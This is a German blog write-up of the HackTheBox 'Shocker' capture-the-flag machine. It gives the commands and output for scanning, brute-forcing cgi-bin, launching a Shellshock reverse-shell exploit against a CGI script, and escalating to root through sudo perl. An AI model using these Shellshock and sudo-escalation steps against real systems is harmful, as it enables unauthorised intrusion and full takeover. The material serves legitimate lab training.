---
title: "HackTheBox - Shocker WriteUp | Tipps + Anleitung"
date: 2018-02-20T16:41:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
  - german
---


# HackTheBox - Shocker WriteUp | Tipps + Anleitung | htb

[Shocker](https://www.hackthebox.eu/home/machines/profile/108) ist eine der vielen Verfügbaren CTF Challenges von [HackTheBox](https://hackthebox.eu/). [Shocker](https://www.hackthebox.eu/home/machines/profile/108) ist eine leichte bis mittelschwere Maschine von [HackTheBox](https://hackthebox.eu/).

[![htbrating](https://imgur.com/zKAwrxI.jpg)](https://imgur.com/zKAwrxI)

## **Tipps**

Der Webserver hat ein interessantes Verzeichnis mit einer Datei drin.

Der Name der Maschine ist bei HackTheBox oft ein Tipp. Das Beitragsbild, welches ich mit meinen immensen Photoshop Sk1llz erstellt habe, ist auch ein "dezenter" Hinweis.

Root-Rechte zu bekommen ist sehr einfach. Allerdings werden dafür Anfängerkenntnisse einer bestimmten Sprache gebraucht.

## **Video**

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/DhlNO97IztU/0.jpg)](http://www.youtube.com/watch?v=DhlNO97IztU)

## **Anleitung**

Als erstes kommt wie immer ein Nmap-Scan.

```shell
root@kali:~# nmap -A 10.10.10.56

[...]
PORT STATE SERVICE VERSION
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
[...]
```

Wenn wir einen Verzeichnis-Bruteforce machen, finden wir das Verzeichnis **cgi-bin**.

```shell
root@kali:~# dirb http://10.10.10.56/ /usr/share/wordlists/dirb/common.txt

[...]
---- Scanning URL: http://10.10.10.56/ ----
+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)
+ http://10.10.10.56/index.html (CODE:200|SIZE:137)
+ http://10.10.10.56/server-status (CODE:403|SIZE:299)
[...]
```

Im Verzeichnis **cgi-bin** befinden sich normalerweise verschiedene Scripts wie z.B. Perl oder Bash. Versuchen wir doch mal welche durch einen weiteren Brute-Force zu finden. Nach der Option **-X** können wir Dateiendungen festlegen, welche an jeden String in unserer Wortliste angehängt werden.

```shell
root@kali:~# dirb http://10.10.10.56/cgi-bin/ /usr/share/wordlists/dirb/common.txt -X .sh,.pl

[...]
---- Scanning URL: http://10.10.10.56/cgi-bin/ ----
+ http://10.10.10.56/cgi-bin/user.sh (CODE:200|SIZE:118)
[...]
```

Das Shell-Skript **user.sh** wurde in dem Verzeichnis **cgi-bin** gefunden.

Anhand des Namens der Maschine ( Shocker ) liegt der verdacht nahe, dass hier die [Shellshock](https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)) Sicherheitslücke ausgenutzt werden kann.  
Mithilfe von **searchsploit** können wir nach Exploits für [Shellshock](https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)) suchen.

```shell
root@kali:~# searchsploit shellshock
--------------------------------------- ----------------------------------
Exploit Title                          | Path
                                       | (/usr/share/exploitdb/)
--------------------------------------- ----------------------------------
Advantech Switch - 'Shellshock' Bash E | exploits/cgi/remote/38849.rb
Apache mod_cgi - 'Shellshock' Remote C | exploits/linux/remote/34900.py
Bash - 'Shellshock' Environment Variab | exploits/linux/remote/34766.php
Bash CGI - 'Shellshock' Remote Command | exploits/cgi/webapps/34895.rb
Cisco UCS Manager 2.1(1b) - Remote Com | exploits/hardware/remote/39568.py
GNU Bash - 'Shellshock' Environment Va | exploits/linux/remote/34765.txt
IPFire - 'Shellshock' Bash Environment | exploits/cgi/remote/39918.rb
NUUO NVRmini 2 3.0.8 - Remote Command  | exploits/cgi/webapps/40213.txt
OpenVPN 2.2.29 - 'Shellshock' Remote C | exploits/linux/remote/34879.txt
PHP < 5.6.2 - 'Shellshock' 'disable_fu | exploits/php/webapps/35146.txt
Postfix SMTP 4.2.x < 4.2.48 - 'Shellsh | exploits/linux/remote/34896.py
RedStar 3.0 Server - 'Shellshock' 'BEA | exploits/linux/local/40938.py
Sun Secure Global Desktop and Oracle G | exploits/cgi/webapps/39887.txt
TrendMicro InterScan Web Security Virt | exploits/hardware/remote/40619.py
dhclient 4.1 - Bash Environment Variab | exploits/linux/remote/36933.py
--------------------------------------- ----------------------------------
Shellcodes: No Result
```

Es gibt viele verschiedene Skripte, welche Remote Code Execution durch [Shellshock](https://de.wikipedia.org/wiki/Shellshock_(Sicherheitsl%C3%BCcke)) ermöglichen.

Einfachheitshalber können wir eines der Skripte benutzen, welche dank Exploitdb schon auf unserer Maschine vorhanden sind.  
Ich benutze das Skript, welches an zweiter Stelle von **searchsploit** angezeigt wurde.

```shell
root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py

Shellshock apache mod_cgi remote exploit

Usage:
./exploit.py var=<value>

Vars:
rhost: victim host
rport: victim port for TCP shell binding
lhost: attacker host for TCP shell reversing
lport: attacker port for TCP shell reversing
pages: specific cgi vulnerable pages (separated by comma)
proxy: host:port proxy

Payloads:
"reverse" (unix unversal) TCP reverse shell (Requires: rhost, lhost, lport)
"bind" (uses non-bsd netcat) TCP bind shell (Requires: rhost, rport)

Example:

./exploit.py payload=reverse rhost=1.2.3.4 lhost=5.6.7.8 lport=1234
./exploit.py payload=bind rhost=1.2.3.4 rport=1234
```

Als Parameter müssen wir **payload**, **rhost**, **lhost**, **lport** und ebenfalls **pages** festlegen.

Jetzt müssen wir nur noch eben unsere IP-Adresse nachsehen.

```shell
root@kali:~# ifconfig tun0
tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500
inet 10.10.15.14 netmask 255.255.254.0 destination 10.10.15.14
[...]
```

Alle Parameter festlegen und los geht's!

```shell
root@kali:~# python /usr/share/exploitdb/exploits/linux/remote/34900.py payload=reverse rhost=10.10.10.56 lhost=10.10.15.14 lport=1234 pages=/cgi-bin/user.sh
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> whoami
shelly
```

Es hat funktioniert, wir haben nun als der Benutzer **Shelly** Zugriff.

Mit **sudo -l** können wir nachsehen, welche Befehle wir als der aktuelle Benutzer mit Root Rechten ausführen lassen können.

```shell
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
(root) NOPASSWD: /usr/bin/perl
```

Wir können also Perl-Befehle als Root ausführen ohne ein Password zu benötigen!

Wir können nun mithilfe von Perl **/bin/sh** ausführen lassen, wodurch wir eine Bash-Shell bekommen. Da wir **sudo** benutzen, wird die Bash-Shell als Root ausgeführt.

```shell
10.10.10.56> sudo perl -e 'exec "/bin/sh";'
10.10.10.56> whoami
root
```

Jetzt wo wir Root-Rechte haben, können wir uns den Root-Hash anzeigen lassen und uns natürlich auch noch den User-Hash holen.

```shell
10.10.10.56> cat /root/root.txt
52c#########ZENSIERT#########467

10.10.10.56> cat /home/shelly/user.txt
2ec#########ZENSIERT#########233
```

Vielen Dank für's durchlesen. :)